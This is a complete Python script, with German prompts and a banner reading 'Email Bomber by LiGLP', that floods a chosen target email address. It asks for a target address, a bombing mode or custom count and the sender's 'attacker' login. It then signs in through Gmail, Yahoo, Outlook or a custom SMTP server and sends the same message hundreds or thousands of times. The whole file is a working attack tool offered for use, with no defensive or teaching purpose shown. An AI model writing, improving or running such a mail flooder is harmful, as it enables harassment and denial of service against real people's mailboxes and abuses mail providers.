import smtplib
import sys


class bColors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'


def banner():
    print(r'''

███████╗███╗   ███╗ █████╗ ██╗██╗         ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
█████╗  ██╔████╔██║███████║██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ by LiGLP

     ''')


class EmailBomber:
    count = 0

    def __init__(self):
        self.amount = None
        try:
            print('\n[+] Starte Bomber ...')
            self.target = str(input('[:] Geben Sie die Ziel-E-Mail-Adresse ein > '))
            self.mode = int(input('[:] Wählen Sie den BOMB-Modus (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(Benutzerdefiniert) > '))

            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('[-] FEHLER: Ungültige Option!')
                sys.exit(0)

        except Exception as e:
            print(f'[-] FEHLER: {e}')
            sys.exit(0)

    def bomb(self):
        try:
            print('\n[+] Baue Bombe auf ...')

            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input( '[:] Anzahl der E-Mails eingeben > '))
            print( f'[+] Sie haben den BOMB-Modus {self.mode} und {self.amount} E-Mails ausgewählt')

        except Exception as e:
            print( f'[-] FEHLER: {e}')
            sys.exit(0)

    def email(self):
        try:
            print( '\n[+] Richte E-Mail ein ...')
            self.server = str(input( '[:] Geben Sie den E-Mail-Server ein | oder wählen Sie eine vordefinierte Option - 1:Gmail 2:Yahoo 3:Outlook 4:Benutzerdefiniert > '))
            defaultPort = True

            if self.server == '4':
                defaultPort = False
                self.port = int(input( '[:] Geben Sie die Portnummer ein > '))

            if defaultPort:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input( '[:] Geben Sie die Angreifer-E-Mail-Adresse ein > '))
            self.fromPwd = str(input( '[:] Geben Sie das Angreifer-Passwort ein > '))
            self.subject = str(input( '[:] Betreff eingeben > '))
            self.message = str(input( '[:] Nachricht eingeben > '))

            if self.target == self.fromAddr:
                print( '\n[-] FEHLER: Angreifer- und Zieladresse dürfen nicht identisch sein.')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print( f'[-] FEHLER: {e}')
            sys.exit(0)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.message)
            self.count += 1
            sys.stdout.write( '\r' + f'[+] {self.count} E-Mails gesendet ' + ('.' * self.count))

        except Exception as e:
            print( f'[-] FEHLER: {e}')
            sys.exit(0)

    def attack(self):
        print( '\n[+] Greife an ...')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print( '\n[+] Angriff abgeschlossen !!')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
